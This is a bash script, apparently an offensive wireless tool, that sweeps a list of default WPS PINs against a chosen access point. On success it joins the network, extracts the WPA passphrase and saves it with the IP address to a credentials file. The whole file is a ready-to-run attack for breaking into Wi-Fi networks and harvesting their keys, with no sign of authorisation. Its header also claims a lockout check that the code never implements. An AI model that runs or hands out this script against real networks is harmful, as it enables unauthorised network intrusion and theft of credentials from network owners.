#!/bin/bash
# wps_try.sh - quick WPS default-PIN attempts on wlan1. wlan0 untouched. Run as root.
# Usage: ./wps_try.sh <BSSID> <SSID> <outdir>
# Tries ~12 well-known default PINs, 25s each. Stops on success or AP lockout signs.
set -u
BSSID="${1:?bssid}"; SSID="${2:?ssid}"; OUT="${3:-./results-wps}"
CTRL=/run/wpa_supplicant_pwn
IF=wlan1
mkdir -p "$OUT"
PINS="12345670 00000000 11111111 22222222 33333333 44444444 55555555 66666666 77777777 88888888 99999999 87654321 20080843 11223344"
echo "[*] WPS PIN sweep vs $SSID ($BSSID), $(echo $PINS | wc -w) PINs" | tee "$OUT/wps.log"

before_ids() { wpa_cli -p $CTRL -i $IF list_networks 2>/dev/null | tail -n +2 | cut -f1 | tr '\n' ' '; }
cleanup_new() { # remove networks added since $1
  for N in $(before_ids); do
    skip=0; for O in $1; do [ "$N" = "$O" ] && skip=1; done
    [ $skip -eq 0 ] && wpa_cli -p $CTRL -i $IF remove_network "$N" >/dev/null 2>&1
  done
  wpa_cli -p $CTRL -i $IF wps_cancel >/dev/null 2>&1
}
fails=0
for PIN in $PINS; do
  OLD=$(before_ids)
  echo "[*] trying PIN $PIN ..." | tee -a "$OUT/wps.log"
  wpa_cli -p $CTRL -i $IF wps_pin "$BSSID" "$PIN" >>"$OUT/wps.log" 2>&1
  S=$(date +%s); DONE=0
  while [ $(( $(date +%s) - S )) -lt 25 ]; do
    ST=$(wpa_cli -p $CTRL -i $IF status 2>/dev/null | grep ^wpa_state=)
    echo "    $ST" >>"$OUT/wps.log"
    if [ "$ST" = "wpa_state=COMPLETED" ]; then DONE=1; break; fi
    sleep 2
  done
  if [ $DONE -eq 1 ]; then
    echo "[+] WPS SUCCESS PIN=$PIN" | tee -a "$OUT/wps.log"
    dhcpcd --timeout 8 $IF >/dev/null 2>&1; sleep 2
    IP=$(ip -4 -o addr show $IF 2>/dev/null | grep -oP 'inet \K\S+')
    NETID=$(wpa_cli -p $CTRL -i $IF list_networks 2>/dev/null | tail -1 | cut -f1)
    PSK=$(wpa_cli -p $CTRL -i $IF get_network "$NETID" psk 2>/dev/null)
    echo "$SSID:WPS-PIN-$PIN / PSK=$PSK / IP=$IP" | tee "$OUT/creds.txt"
    exit 0
  fi
  fails=$((fails+1))
  cleanup_new "$OLD"
  # lockout heuristic: 3 consecutive instant failures
  echo "[ ] PIN $PIN failed" | tee -a "$OUT/wps.log"
done
echo "[DONE] WPS sweep finished, no hit ($fails PINs). AP may lock WPS after abuse - not retried." | tee -a "$OUT/wps.log"
exit 1
